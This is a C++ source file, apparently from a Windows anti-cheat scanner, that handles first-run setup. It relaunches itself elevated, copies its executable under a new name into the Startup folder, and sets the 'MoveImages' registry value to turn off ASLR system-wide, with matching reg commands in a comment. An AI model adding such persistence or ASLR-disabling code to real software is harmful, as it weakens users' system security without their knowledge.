
#include "StdAfx.h"
#include <direct.h> // testar depois!

int CheckBoth = 0;
int Ok = 0;
int JustOne = 0;

int StartUpExist1 = 0;
int StartUpExist(){
	//cout <<"Exe file exist on win Startup folder!"<<endl;
	StartUpExist1 = 1;
	return (0);
}
int RegistryExist1 = 0;
int RegistryExist(){
	//cout <<"Registry key (MoveImages) that disable ALSR exist!"<<endl;
	RegistryExist1 = 1;
	return (0);
}
int AreXP2 = 0;
int AreXP(){
	//cout <<"Windows XP running!"<<endl;
	AreXP2 = 1;
	return(0);
}


//Disable Admin for Main
void disable_Admin_main()
{
char buffer[MAX_PATH];//always use MAX_PATH for filepaths
GetModuleFileName(NULL,buffer,sizeof(buffer));
//cout << buffer << "\n";

HKEY hk1;
	long n1 = RegOpenKey(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers"), &hk1 );
    if ( n1 == ERROR_SUCCESS ) {
    	//cout << "1 OK" << endl;
	RegDeleteValue(hk1, buffer);
    RegCloseKey(hk1);
    }
    else {
       //cout << "1 Failed with value " << n1 << endl;
	   RegCloseKey(hk1);
    }

HKEY hk1b;
	long n1b = RegOpenKey(HKEY_LOCAL_MACHINE,TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers"), &hk1b );
    if ( n1b == ERROR_SUCCESS ) {
    	//cout << "1 OK" << endl;
	RegDeleteValue(hk1b, buffer);
    RegCloseKey(hk1b);
    }
    else {
    	//cout << "1b Failed with value " << n1 << endl;
		RegCloseKey(hk1b);
    }

HKEY hk2;
	long n2 = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers"), 0,KEY_QUERY_VALUE, &hk2 );
    if ( n2 == ERROR_SUCCESS ) {
    	//cout << "2 OK" << endl;
	RegDeleteValue(hk2, buffer);
    RegCloseKey(hk2);
    }
    else {
    	//cout << "2 Failed with value " << n2 << endl;
		RegCloseKey(hk2);
    }

	HKEY hk2b;
	long n2b = RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers"), 0,KEY_QUERY_VALUE, &hk2b );
    if ( n2b == ERROR_SUCCESS ) {
    	//cout << "2b OK" << endl;
	RegDeleteValue(hk2b, buffer);
    RegCloseKey(hk2b);
    }
    else {
    	//cout << "2 Failed with value " << n2b << endl;
		RegCloseKey(hk2b);
    }


   HKEY hk3;
	long n3 = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers"), 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hk3);
    if ( n3 == ERROR_SUCCESS ) {
    	//cout << "3 OK" << endl;
	RegDeleteValue(hk3, buffer);
    RegCloseKey(hk3);
    }
    else {
    	//cout << "3 Failed with value " << n3 << endl;
		RegCloseKey(hk3);
    }
}

// Deny Admin message
void DenyAdmin(){
	disable_Admin_main();	
	if (carrega.Message_Warning_En == 1){
	MessageBoxA(NULL,"Anti-Kill - Scan - Administrative privileges are not allowed for this application!\n\nRestart application as single user please!", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
    }	
	if (carrega.Message_Warning_En == 2){
	MessageBoxA(NULL,"Anti-Kill - Scan - Pivilegios administrativos não são permitidos para esta aplicação!\n\nReinicie o aplciativo como usuário padrão por favor", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);
	}
	else
	{
	MessageBoxA(NULL,"Anti-Kill - Scan - Administrative privileges are not allowed for this application!\n\nRestart application as single user please!", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);
}
}
// Deny Admin rights for injector
BOOL DenyAdminRights(){
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if( hToken )
	{	
    CloseHandle( hToken );
    }
	//cout<< fRet;
	if (fRet == 1){
	DenyAdmin();
	//cout <<"Are Admin!";
	return fRet;
	}
	else
	{
}
return fRet;
}
int DenyAdm(){
    if (carrega.Copy_exe_to_Windows_Startup == 1 && StartUpExist1 == 0){
	//cout << "startup" <<endl;
	return(0);
	}
  	if (carrega.Disable_Windows_ASLR == 1 && AreXP2 == 0 && RegistryExist1 == 0 ){
	//cout << "registry" <<endl;
	return (0);
    }
	else
	{
	DenyAdminRights();
}
	return(0);
}


//Messages
void AskforUserPermissionXP(){
	if (carrega.Message_Warning_En == 1){
	MessageBoxA(NULL,"Administrative privileges required at the first startup!\n\nRight click on application: Run as administrator", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
    }	
	if (carrega.Message_Warning_En == 2){
	MessageBoxA(NULL,"Privilegios administrativos requeridos na primeira inicialização!\n\nClick direito do mouse no aplciativo: Executar como admintrator", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
	}
	else
	{
	MessageBoxA(NULL,"Administrative privileges required at the first startup!\n\nRight click on application: Run as administrator", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);
}
}
void itsOk3(){
	if (carrega.Message_Warning_En == 1){
	MessageBoxA(NULL,"Update done!\n\nRestart application please!", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
    }	
	if (carrega.Message_Warning_En == 2){
	MessageBoxA(NULL,"Update finalizado!\n\nReinicie o aplicativo por favor.", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
	}
	else
	{
	MessageBoxA(NULL,"Update done!\n\nRestart application please!", carrega.Nome_das_Janelas, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);
}
}
void itsOk2(){
	CreateThread(NULL,NULL,LPTHREAD_START_ROUTINE(itsOk3),NULL,0,0);
	Sleep(3000);
	ExitProcess(0);
}
int itsOk(){
	Ok++;
	if (Ok == 1 ){
    itsOk2(); // win 7 Startup and Regystry ok!
}
	  return(0);
}


// Make changes
int writeToRegistry(void)
{	
    DWORD lRv;
    HKEY hKey;
    DWORD dwDisposition;
    lRv = RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    DWORD dwValue = 0;
    RegSetValueEx(hKey,"MoveImages", 0, REG_DWORD, reinterpret_cast<BYTE *>(&dwValue), sizeof(dwValue));
    RegCloseKey(hKey);
    itsOk();
	return(1);
}
int CopyHide(){
  //cout <<"Copy and rename exe file to win startup folder!"<<endl<<endl;;
  fstream f(carrega.StartUp_Original_Name, fstream::in|fstream::binary);
  f << noskipws;
  istream_iterator<unsigned char> begin(f);
  istream_iterator<unsigned char> end;

  fstream f2(carrega.StartUp_Address_NewName, //xp  	 
  fstream::out|fstream::trunc|fstream::binary);
  ostream_iterator<char> begin2(f2);
  copy(begin, end, begin2);

 // if (AreXP2 == 1){
  ifstream ifile (carrega.StartUp_Address_NewName); 
  if (!ifile){
  AskforUserPermissionXP(); //Problem!  Ask for admin permission...
  return(0);
  }
  else
  {
  itsOk(); 
}
  return(0);
}

//RunAs admin for windows 7
void RunAs7_2(){
	JustOne ++;
	if (JustOne == 1){
char buffer[MAX_PATH];//always use MAX_PATH for filepaths
GetModuleFileName(NULL,buffer,sizeof(buffer));
ShellExecute(NULL, "runas", buffer, 0, 0, SW_SHOWNORMAL);
ExitProcess(0);
	}
}
void RunAs7(){
	CreateThread(NULL,NULL,LPTHREAD_START_ROUTINE(RunAs7_2),NULL,0,0);
}

int CheckAgain(){
	    if (RegistryExist1 == 0){
		CreateThread(NULL,NULL,LPTHREAD_START_ROUTINE(writeToRegistry),NULL,0,0);
		}
		if (StartUpExist1 == 0){
		CreateThread(NULL,NULL,LPTHREAD_START_ROUTINE(CopyHide),NULL,0,0);	
		}
		else
		{
		}
		return 0;
}
BOOL IsRunAsAdministrator()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority, 
        2, 
        SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 
        0, 0, 0, 0, 0, 0, 
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:

    if (pAdministratorsGroup)
    {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }
    return fIsRunAsAdmin;
}
int IsElevated()
{
if(IsRunAsAdministrator())
		{
		CheckAgain();
	    }
		else
		{
		RunAs7(); //RunAs admin for windows 7
		}
	    return 0;
}


/*
Disable ASLR .bat: (create key)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v MoveImages /t REG_DWORD /d 0X00000000 

Enable  ASLR .bat: (delete key)
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v MoveImages  
*/
int Exists_Registry2()
 { 
  HKEY hKey;
  //Check if the registry exists
  DWORD lRv = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0,KEY_READ, &hKey);
  if (lRv == ERROR_SUCCESS)
  {
    DWORD BufferSize = sizeof(DWORD);
    DWORD dwRet;
    DWORD cbData;
    DWORD cbVal = 0;
    dwRet = RegQueryValueEx(hKey, "MoveImages", NULL, NULL,(LPBYTE)&cbVal, &cbData);
        if( dwRet == ERROR_SUCCESS ){
		RegistryExist();
		return(0);
	    }
		if( dwRet != ERROR_SUCCESS ){
	//cout <<"Registry key (MoveImages) that disable ALSR does not exist!"<<endl;
	IsElevated();		
}
}
return(0);
}

int AreXpRunning()
{
    DWORD dwVersion = 0; 
    DWORD dwMajorVersion = 0;
    DWORD dwMinorVersion = 0; 
    DWORD dwBuild = 0;

    dwVersion = GetVersion();
    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

    if (dwVersion < 0x80000000)              
        dwBuild = (DWORD)(HIWORD(dwVersion));
    //printf("Version is %d.%d (%d)\n", dwMajorVersion, dwMinorVersion, dwBuild);
	if (dwMajorVersion < 6){
	AreXP();
	return(0);
	}
	else
	{
	Exists_Registry2();
	}
	return(0);
}
 
void Exists_Registry(){
	AreXpRunning();
}	


//Startup don't exist, check version:
void Exists_Startup3()
{	
    DWORD dwVersion = 0; 
    DWORD dwMajorVersion = 0;
    DWORD dwMinorVersion = 0; 
    DWORD dwBuild = 0;
    dwVersion = GetVersion(); 
    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
    if (dwVersion < 0x80000000)              
    dwBuild = (DWORD)(HIWORD(dwVersion));
//printf("Version is %d.%d (%d)\n", dwMajorVersion, dwMinorVersion,  dwBuild);
	if ("(%d)", dwBuild < 6000){ //NT 6.0 Windows Vista
	AreXP();
	CopyHide();  // go to CopyHide witout check ADIMIN, if admin are running changes will be done. 
	}
	else
	{		
	//cout <<"Windows 7 system"<<endl;   //are 7       
	IsElevated(); //check admin
	}
}
int Exists_Startup2(const char *filename)
{	
 ifstream ifile (carrega.StartUp_Address_NewName); 
  if (!ifile){
//cout <<"Exe file don't exits on win Startup folder!"<<endl;
  Exists_Startup3();
  return(0);
  }
  else
  {  
  StartUpExist();
  return(0);
  }
}  // if exist startup return 0
void Exists_Startup(){
	Exists_Startup2(0);
}





							
 
















